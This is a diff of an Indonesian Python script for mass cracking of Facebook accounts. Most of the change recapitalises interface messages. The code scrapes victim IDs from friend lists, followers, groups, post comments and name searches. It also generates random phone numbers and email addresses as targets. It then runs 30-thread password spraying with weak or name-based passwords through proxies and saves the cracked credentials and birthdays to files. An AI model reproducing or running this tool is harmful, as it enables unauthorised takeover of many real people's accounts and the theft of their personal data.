@@ -205,7 +205,7 @@ for x in range(999):
 	if F in redmi:pass
 	else:redmi.append(F)
 try:abcd = open('.proxy.txt','r').read().splitlines()
-except:sys.exit(f" [{M}>{P}] gagal dump proxy")
+except:sys.exit(f" [{M}>{P}] Gagal Dump Proxy")
 print(' total new proxy : '+str(len(abcd)))
 print(' total useragent : '+str(len(redmi)))
 sleep(1)
@@ -257,7 +257,7 @@ def remove():
 	
 	
 	
-###---[ MENU UTAMS ]---###
+###---[ MENU UTAMA ]---###
 def menu(n,t,c):
 	clear_layar()
 	print(logo(n)+f'\n')
@@ -292,14 +292,14 @@ def cek_opsi_cp():
 	nom, no = [], 0
 	print(' ─────────────────────────────')
 	try:ok = os.listdir('CP')
-	except:sys.exit(f" [{M}>{P}] tidak ada hasil cp")
+	except:sys.exit(f" [{M}>{P}] Tidak Ada Hasil Cp")
 	for x in ok:
 		nom.append(x)
 		no+=1
 		try:jum= open('CP/'+x,'r').readlines()
 		except:continue
 		print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')	
-	exc = input(f' [{kk}<{P}] nomor yang akan di cek\n nomor : ')
+	exc = input(f' [{kk}<{P}] Nomor Yang Akan Di Cek\n nomor : ')
 	file = nom[int(exc)-1]
 	print(' ─────────────────────────────')
 	detek.append('file')
@@ -308,7 +308,7 @@ def cek_opsi_cp():
 		try:id,pw = data.split('|')
 		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
 		cek_opsi(id,pw,ua)
-	exit(f'\r [{hh}<{P}] cek opsi checkpoint telah selesai')
+	exit(f'\r [{hh}<{P}] Cek Opsi Checkpoint Telah Selesai')
 	
 
 
@@ -320,28 +320,28 @@ def cek_akun():
 	try:t=open('.token.txt','r').read();c={'cookie':open('.cookie.txt','r').read()}
 	except:print(f' [{M}>{P}] cookie invalid');exit()
 	try:ok = os.listdir('OK')
-	except:sys.exit(f" [{M}>{P}] tidak ada hasil ok awokawokawok")
+	except:sys.exit(f" [{M}>{P}] Tidak Ada Hasil Ok,Makanya Ganteng")
 	for x in ok:
 		nom.append(x)
 		no+=1
 		try:jum= open('OK/'+x,'r').readlines()
 		except:continue
 		print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	
-	exc = input(f' [{hh}<{P}] nomor file yang akan di cek\n file : ')
-	xxx = input(' simpan akun tidak kenon ke file apa : \n nama : ')
+	exc = input(f' [{hh}<{P}] Nomor File Yang Akan Di Cek\n file : ')
+	xxx = input(' Simpan Akun Tidak Kenon Ke File Apa : \n nama : ')
 	nonon = xxx+'.txt'
 	file = nom[int(exc)-1]
 	print(' ─────────────────────────────')
-	print(f' akun tidak kenon di : {nonon}\n akun yang kenon di  : buang goblok')
+	print(f' akun tidak kenon di : {nonon}\n Akun Yang Kenon Di  : Buang Goblok')
 	print(' ─────────────────────────────')
 	try:
 		uuid = open('OK/'+file,'r').read().splitlines()
 		mek = 0
 		for data in uuid:
-			print(f'\r [{hh}>{P}] aman : {nga} down : {sesi}',end='')
+			print(f'\r [{hh}>{P}] Aman : {nga} Down : {sesi}',end='')
 			sys.stdout.flush()
 			try:user,nama = data.split('|')
-			except:exit(f" [{M}>{P}] pemisah salah")
+			except:exit(f" [{M}>{P}] Pemisah Salah")
 			xx = open(nonon,'a')
 			try:
 				mek+=1
@@ -354,51 +354,51 @@ def cek_akun():
 				print(f'\r [{M}{mek}{P}] {user}|{nama}                  ')
 				sesi+=1
 	except Exception as e :
-		exit(f" [{M}>{P}] file tidak ada")
+		exit(f" [{M}>{P}] File Tidak Ada")
 		
 		
 ###---[CEK HASIL CRACK ]---###
 def cek_hasil():
 	no,nom = 0,[]
-	one = input(f' [{hh}1{P}] cek hasil akun ok\n [{hh}2{P}] cek hasil akun cp\n menu : ')
+	one = input(f' [{hh}1{P}] Cek Hasil Akun Ok\n [{hh}2{P}] Cek Hasil Akun Cp\n menu : ')
 	if one in ['1','01']:
 		try:ok = os.listdir('OK')
-		except:sys.exit(f" [{M}>{P}] tidak hasil ok")
+		except:sys.exit(f" [{M}>{P}] Tidak Hasil Ok")
 		for x in ok:
 			nom.append(x)
 			no+=1
 			try:jum= open('OK/'+x,'r').readlines()
 			except:continue
-			print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	
-		abc = input(f' [{hh}<{P}] nomor file : ')
+			print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}Akun')	
+		abc = input(f' [{hh}<{P}] Nomor File : ')
 		file = nom[int(abc)-1]
 		try:buka = open('OK/'+file,'r').read()
-		except:sys.exit(f" [{M}>{P}] file tidak ada hasil ok")
+		except:sys.exit(f" [{M}>{P}] File Tidak Ada Hasil Ok")
 		print(hh+buka+P)
 	elif one in ['2','02']:
 		try:ok = os.listdir('CP')
-		except:sys.exit(f" [{M}>{P}] tidak hasil cp")
+		except:sys.exit(f" [{M}>{P}] Tidak Hasil Cp")
 		for x in ok:
 			nom.append(x)
 			no+=1
 			try:jum= open('CP/'+x,'r').readlines()
 			except:continue
-			print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')		
-		abc = input(f' [{hh}<{P}] nomor file : ')
+			print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}Akun')		
+		abc = input(f' [{hh}<{P}] Nomor File : ')
 		file = nom[int(abc)-1]
 		try:buka = open('CP/'+file,'r').read()
-		except:sys.exit(f" [{M}>{P}] file tidak ada hasil cp")
+		except:sys.exit(f" [{M}>{P}] File Tidak Ada Hasil Cp")
 		print(kk+buka+P)
-	else:sys.exit(f" [{M}>{P}] isi yang benar")
+	else:sys.exit(f" [{M}>{P}] Isi Yang Benar")
 		
 		
 ###---[ DUMP NO LOGIN ]---###
 def crack_nomor():
-	print(f' [{hh}<{P}] crack nomor gunakan sandi manual')
-	depan = input(' awalan : ')
+	print(f' [{hh}<{P}] Crack Nomor Gunakan Sandi Manual')
+	depan = input(' Awalan : ')
 	if len(depan)==3:pass
-	else:exit(f' [{M}>{P}] contoh awalan nomor 089')
-	jumla = input(' jumlah : ')
+	else:exit(f' [{M}>{P}] Contoh Awalan Nomor 085')
+	jumla = input(' Jumlah : ')
 	for x in range(int(jumla)):
 		rr = random.randint
 		A = depan
@@ -407,7 +407,7 @@ def crack_nomor():
 		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
 		if D in dump:pass
 		else:dump.append(D+'|123456')
-		print('\r sedang dump %s id'%(len(dump)),end=" ")
+		print('\r Sedang Dump %s ID'%(len(dump)),end=" ")
 		sys.stdout.flush()
 		sleep(0.0000003)
 	atur_atur()
@@ -419,14 +419,14 @@ def clon_email():
 	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
 	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
 	global ok , cp
-	print(f' [{hh}>{P}] dump dari email, max 1000 id')
+	print(f' [{hh}>{P}] Dump Dari Email,Max 3000 ID')
 	nama = input(' target : ')
 	if ',' in str(nama):
-		exit(f' [{M}<{P}] masukan 1 nama saja')
-	doma = input(' domain : ')
+		exit(f' [{M}<{P}] Masukan 1 Nama Saja')
+	doma = input(' Domain : ')
 	if '@' not in str(doma) or '.com' not in str(doma):
-		exit(f' [{M}<{P}] masukan domain yang benar')
-	jumlah = input(' total  : ')
+		exit(f' [{M}<{P}] Masukan Domain Yang Benar')
+	jumlah = input(' Total  : ')
 	for xyz in range(int(jumlah)):
 		A = nama
 		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
@@ -435,30 +435,30 @@ def clon_email():
 		if D in dump:pass
 		else:dump.append(D+'|'+nama)
 		if len(dump)==2000:atur_atur()
-		print('\r sedang dump %s id'%(len(dump)),end='')
+		print('\r Sedang Dump %s ID'%(len(dump)),end='')
 		sys.stdout.flush()
 	atur_atur()	
 
 def crack_file():
-	file = input(f' [{hh}<{P}] masukan nama file dump\n file : ')
+	file = input(f' [{hh}<{P}] Masukan Nama File Dump\n File : ')
 	try:
 		uuid = open(file,'r').readlines()
 		for data in uuid:
 			try:user,nama = data.split('|')
-			except:exit(f" [{M}>{P}] pemisah salah")
+			except:exit(f" [{M}>{P}] Pemisah Salah")
 			dump.append(data)
-			print('\r sedang dump %s id'%(len(dump)),end=" ")
+			print('\r Sedang Dump %s ID'%(len(dump)),end=" ")
 			sleep(0.0000003)
-	except FileNotFoundError:exit(f" [{M}>{P}] file tidak ada")
-	print(f'\r [{hh}<{P}] total jumlah akun adalah {len(dump)}')
+	except FileNotFoundError:exit(f" [{M}>{P}] File Tidak Ada")
+	print(f'\r [{hh}<{P}] Total Jumlah Akun Adalah {len(dump)}')
 	atur_atur()
 	
 def crack_search():
 	nama = []
 	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
 	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
-	print(f' [{hh}<{P}] 1 nama setara dengan 10k akun')
-	nam = input(f' nama : ').split(",")
+	print(f' [{hh}<{P}] 1 Nama Setara Dengan 10k Akun')
+	nam = input(f' Nama : ').split(",")
 	for ser in nam:		
 		for belakang in custom:
 			id = ser+belakang
@@ -477,7 +477,7 @@ def cari_nama(link):
 		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
 		for uid,nama in data:
 			if 'profile.php?' in uid:
-				uid = re.findall('id=(.*)',str(uid))[0]
+				uid = re.findall('ID=(.*)',str(uid))[0]
 			elif '<span' in nama:
 				nama = re.findall('(.*?)\<',str(nama))[0]
 			bo = uid+'|'+nama
@@ -486,19 +486,19 @@ def cari_nama(link):
 	try:
 		link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
 		if(link):
-			print('\r sedang dump %s id'%(len(dump)),end=" ")
+			print('\r Sedang Dump %s ID'%(len(dump)),end=" ")
 			sys.stdout.flush()
 			cari_nama(link)
 	except:pass
 	
 
 def crack_komen():
-	ide = input(f' [{hh}<{P}] masukan id postingan target\n id post : ')
+	ide = input(f' [{hh}<{P}] Masukan ID Postingan Target\n ID Post : ')
 	url = 'https://mbasic.facebook.com/'+ide
 	try:get_komen(url)
 	except KeyboardInterrupt:atur_atur()
 	if len(dump)==0:
-		exit(f' [{M}>{P}] gagal dump komen')
+		exit(f' [{M}>{P}] Gagal Dump Coment')
 	atur_atur()
 
 def get_komen(url):
@@ -510,9 +510,9 @@ def get_komen(url):
 			nama = ids.text
 			if id+"|"+nama in dump:pass
 			else:dump.append(id+"|"+nama)
-			print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush()
+			print(f'\r Sedang Dump {len(dump)} ID ',end='');sys.stdout.flush()
 	for z in data.find_all("a",href=True):
-		if "Lihat komentar sebelumnya…" in z.text:
+		if "Lihat Komentar Sebelumnya…" in z.text:
 			try:get_komen("https://mbasic.facebook.com"+z["href"])
 			except:pass
 			
@@ -527,13 +527,13 @@ def crack_publik(t,c):
 			try:
 				try:dump.append(pi['username']+'|'+pi['name'])
 				except:dump.append(pi['id']+'|'+pi['name'])
-				print('\r sedang dump %s id'%(len(dump)),end=" ")
+				print('\r Sedang Dump %s ID'%(len(dump)),end=" ")
 				sys.stdout.flush()
 				time.sleep(0.0002)
 			except:continue
 		atur_atur()
 	except (KeyError,IOError):
-		exit(f" [{M}>{P}] akun tidak publik")	
+		exit(f" [{M}>{P}] Akun Tidak Publik")	
 
 
 def crack_masal(t,c):
@@ -550,38 +550,38 @@ def crack_masal(t,c):
     		for pi in bas['friends']['data']:
     		      try:dump.append(pi['username']+'|'+pi['name'])
     		      except:dump.append(pi['id']+'|'+pi['name'])
-    		      print('\r sedang dump %s id'%(len(dump)),end=" ")
+    		      print('\r Sedang Dump %s ID'%(len(dump)),end=" ")
     		      sys.stdout.flush()
     		      time.sleep(0.0002)
     	except:
-    		print(f"\r [{kk}!{P}] akun tidak publik       ")
+    		print(f"\r [{kk}!{P}] Akun Tidak Publik       ")
     		continue	                       		
     atur_atur()
     
     
 def crack_foll(t,c):
-	akun = input(f' [{hh}<{P}] pastikan akun bersifat publik \n akun : ')
+	akun = input(f' [{hh}<{P}] Pastikan Akun Bersifat Publik \n Akun : ')
 	try:
 		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
 		for pi in bas["subscribers"]["data"]:
 			try:
 				try:dump.append(pi['username']+'|'+pi['name'])
 				except:dump.append(pi['id']+'|'+pi['name'])
-				print('\r sedang dump %s id'%(len(dump)),end=" ")
+				print('\r Sedang Dump %s ID'%(len(dump)),end=" ")
 				sys.stdout.flush()
 				time.sleep(0.0002)
 			except:continue
 		atur_atur()
 	except (KeyError,IOError):
-		exit(f" [{M}>{P}] akun tidak publik")
+		exit(f" [{M}>{P}] Akun Tidak Publik")
 		
 def crack_group():
-	link = input(f' [{hh}<{P}] pastikan group bersifat publik \n id group : ')
+	link = input(f' [{hh}<{P}] Pastikan Group Bersifat Publik \n ID Group : ')
 	url = "https://mbasic.facebook.com/groups/"+link
 	try:dump_grup(url)
 	except KeyboardInterrupt:atur_atur()
 	if len(dump)==0:
-		exit(f' [{M}>{P}] gagal dump group')
+		exit(f' [{M}>{P}] Gagal Dump Group')
 	atur_atur()
 
 def dump_grup(url):
@@ -591,11 +591,11 @@ def dump_grup(url):
 			par = x.text
 			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
 				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
-				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
+				if " Mengajukan Pertanyaan ." in par:nama = par.replace(" Mengajukan Pertanyaan .","")
 				else:nama = par.split(" > ")[0]
 				if id+"|"+nama in dump:pass
 				else:dump.append(id+"|"+nama)
-				print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush()
+				print(f'\r Sedaang Dump {len(dump)} ID ',end='');sys.stdout.flush()
 		for z in data.find_all("a"):
 			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
 				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
@@ -647,11 +647,11 @@ def manual():
 	global ok,cp
 	pwx = []
 	print(f"{P} ─────────────────────────────")
-	B = input(f' [{hh}>{P}] input sandi manual 6 kata\n sandi  : ').split(',')
+	B = input(f' [{hh}>{P}] Input Sandi Manual 6 Kata\n Sandi  : ').split(',')
 	for x in B:
 		pwx.append(x)
 	print(f"{P} ─────────────────────────────")
-	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
+	print(f' Akun Ok Di : {sim_ok}\n Akun Cp Di : {sim_cp}')
 	print(f"{P} ─────────────────────────────")
 	awal = datetime.now()
 	with tred(max_workers=30) as babas:
@@ -666,7 +666,7 @@ def manual():
 			else:
 				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
 	sleep(5)
-	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
+	exit(f'\r [{hh}<{P}] Brute Force Telah Selesai Jumlah OK:{ok} Jumlah CP:{cp} ')
 
 
 def gabung():
@@ -674,12 +674,12 @@ def gabung():
 	pwx = []
 	A = ["123456"]
 	print(f"{P} ─────────────────────────────")
-	B = input(f' [{hh}>{P}] input sandi manual 6 kata\n sandi  : ').split(',')
-	C = input(f' [{hh}>{P}] input sandi belakang nama\n sandi  : ')
+	B = input(f' [{hh}>{P}] Input Sandi Manual 6 Kata\n Sandi  : ').split(',')
+	C = input(f' [{hh}>{P}] Input Sandi Belakang Nama\n Sandi  : ')
 	if ',' in str(C):
 		exit(f" [{M}>{P}] sandi belakang satu kata saja")
 	print(f"{P} ─────────────────────────────")
-	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
+	print(f' Akun Ok Di : {sim_ok}\n Akun Cp Di : {sim_cp}')
 	print(f"{P} ─────────────────────────────")
 	awal = datetime.now()
 	with tred(max_workers=30) as babas:
@@ -721,7 +721,7 @@ def gabung():
 			else:
 				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
 	sleep(5)
-	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
+	exit(f'\r [{hh}<{P}] Brute Force Telah Selesai Jumlah OK:{ok} Jumlah CP:{cp} ')
 				
 
 def otomatis():
@@ -777,7 +777,7 @@ def otomatis():
 			else:
 				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
 	sleep(5)
-	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
+	exit(f'\r [{hh}<{P}] Brute Force Telah Selesai Jumlah OK:{ok} Jumlah CP:{cp} ')
 	#os.popen('play-audio data/selesai.mp3')
 				
 
@@ -867,7 +867,7 @@ def cek_opsi(idf,pw,ua):
 		ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
 		m, d, y = ttl.split('/')
 		m = tete[m]
-		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           '
+		akun += f' [{kk}>{P}] Email  : {kk}{idf}{P}          \n [{kk}>{P}] Sandi  : {kk}{pw}          {P}\n [{kk}>{P}] TGL Lahir  : {kk}{d} {m} {y}{P}           '
 		mek = f"{idf}|{pw}|{day} {month} {year}"
 		if 'file' in detek:pass
 		else:open('CP/'+sim_cp,'a').write(mek+'\n')
@@ -875,7 +875,7 @@ def cek_opsi(idf,pw,ua):
 		month = ""
 		day = ""
 		year = ""
-		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}'
+		akun += f' [{kk}>{P}] Email  : {kk}{idf}{P}          \n [{kk}>{P}] Sandi  : {kk}{pw}          {P}'
 		if 'file' in detek:pass
 		else:open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
 	try:
